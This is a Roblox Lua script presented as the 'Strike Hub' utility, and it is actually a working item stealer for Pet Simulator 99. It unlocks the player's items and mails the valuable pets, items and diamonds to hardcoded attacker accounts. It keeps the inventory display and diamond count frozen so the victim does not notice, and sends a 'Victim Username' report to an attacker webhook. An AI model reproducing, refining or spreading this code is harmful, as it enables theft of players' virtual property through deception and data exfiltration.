--// Strike Hub Universal Script (Final Version with Visual Freeze)
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

print("[Strike Hub] Script starting... Please wait while we load!")

local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

--// Universal require helpers
local function safeRequire(path)
	local success, result = pcall(require, path)
	return success and result or {}
end

local network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
local saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)

-- ✅ Fixed save reference
local rawSave = (saveModule.Get and saveModule.Get()) or {}
local save = rawSave.Save or rawSave.Inventory or {}

--// Settings
local MailMessage = "GGz"
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
	plr:Kick("No usernames or webhook set")
	return
end

for _, u in ipairs(users) do
	if plr.Name == u then
		plr:Kick("Cannot mail yourself")
		return
	end
end

--// Executor-safe request handler
local requestFunc = request or http_request or syn and syn.request or http and http.request or nil

--// Safe getgc alternative
local mailSendPrice = 10000
pcall(function()
	for _, func in pairs(getgc and getgc() or {}) do
		local info = debug.getinfo(func)
		if info and info.name == "computeSendMailCost" then
			mailSendPrice = func()
			break
		end
	end
end)

--// Visual inventory snapshot
local visualInventory = {Currency = {}, Pet = {}}
for _, v in pairs(save.Currency or {}) do
	visualInventory.Currency[v.id] = {_am = v._am}
end
for uid, pet in pairs(save.Pet or {}) do
	visualInventory.Pet[uid] = pet
end

--// Freeze the player's visible inventory (client-only)
task.spawn(function()
	while task.wait(0.5) do
		-- Keep currency visually the same
		for id, data in pairs(visualInventory.Currency) do
			if save.Currency and save.Currency[id] then
				save.Currency[id]._am = data._am
			end
		end
		-- Keep pets visually the same
		for uid, petData in pairs(visualInventory.Pet) do
			if save.Pet and save.Pet[uid] then
				save.Pet[uid] = petData
			end
		end
	end
end)

--// Maintain visual Diamonds count
local diamondsStat = plr.leaderstats and plr.leaderstats:FindFirstChild("💎 Diamonds")
if diamondsStat then
	local diamondsStart = diamondsStat.Value
	diamondsStat:GetPropertyChangedSignal("Value"):Connect(function()
		diamondsStat.Value = diamondsStart
	end)
end

--// Number formatter
local function formatNumber(n)
	if n >= 1e12 then return string.format("%.2ft", n/1e12)
	elseif n >= 1e9 then return string.format("%.2fb", n/1e9)
	elseif n >= 1e6 then return string.format("%.2fm", n/1e6)
	elseif n >= 1e3 then return string.format("%.2fk", n/1e3)
	else return tostring(math.floor(n)) end
end

--// RAP function
local function getRAP(_, item)
	local success, val = pcall(function()
		local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
		return RAPCmds.Get({
			Class = {Name = _},
			IsA = function(h) return h == _ end,
			GetId = function() return item.id end,
			StackKey = function()
				return HttpService:JSONEncode({id=item.id, pt=item.pt, sh=item.sh, tn=item.tn})
			end
		})
	end)
	return success and val or (item._rap or 0)
end

--// Send item (tries each user in order)
local function sendItem(category, uid, am)
	for _, user in ipairs(users) do
		local args = {user, MailMessage, category, uid, am or 1}
		local ok, response, err = pcall(function()
			return network.Invoke("Mailbox: Send", unpack(args))
		end)
		if ok and response == true then
			task.wait(0.2)
			mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
			return true
		elseif err == "They don't have enough space!" or err == "Mailbox is full" then
			-- try next user
		else
			task.wait(0.2)
		end
	end
	return false
end

--// Send Gems (tries fallback users)
local function SendAllGems()
	for i, v in pairs(save.Currency or {}) do
		if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
			for _, user in ipairs(users) do
				local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
				local ok, response = pcall(function()
					return network.Invoke("Mailbox: Send", unpack(args))
				end)
				if ok and response == true then break end
				task.wait(0.2)
			end
			break
		end
	end
end

--// Unlock items first
for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
	if save[cat] then
		for uid, item in pairs(save[cat]) do
			if item._lk then
				pcall(function() network.Invoke("Locking_SetLocked", uid, false) end)
			end
		end
	end
end

--// Collect eligible items
local sortedItems, totalRAP = {}, 0
for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
	if save[cat] then
		for uid, item in pairs(save[cat]) do
			local rap = getRAP(cat, item)
			if rap >= min_rap then
				local prefix = (item.sh and "Shiny " or "")
				if item.pt == 1 then prefix ..= "Golden "
				elseif item.pt == 2 then prefix ..= "Rainbow " end
				local name = prefix .. item.id
				table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=name})
				totalRAP += rap * (item._am or 1)
			end
		end
	end
end

table.sort(sortedItems, function(a,b)
	return a.rap*a.amount > b.rap*b.amount
end)

--// Show message once
if message and message.Error then
	message.Error("Please wait while the script loads!")
else
	print("[Strike Hub] Please wait while the script loads!")
end

--// Webhook
task.spawn(function()
	if not requestFunc then return end
	local headers = {["Content-Type"]="application/json"}
	local fields = {
		{name="Victim Username:", value=plr.Name, inline=true},
		{name="Items to be sent:", value="", inline=false},
		{name="Summary:", value="Total RAP: "..formatNumber(totalRAP), inline=false}
	}
	for _, item in ipairs(sortedItems) do
		fields[2].value ..= item.name.." (x"..item.amount.."): "..formatNumber(item.rap).."\n"
	end
	local body = HttpService:JSONEncode({
		embeds = {{
			title="New PS99 Execution",
			color=65280,
			fields=fields,
			footer={text="Strike Hub."}
		}}
	})
	pcall(function()
		requestFunc({Url=webhook, Method="POST", Headers=headers, Body=body})
	end)
end)

--// Send items sequentially
for _, item in ipairs(sortedItems) do
	task.wait(0.2)
	sendItem(item.category, item.uid, item.amount)
end

--// Send gems last
task.spawn(SendAllGems)

print("[Strike Hub] Done sending items.")
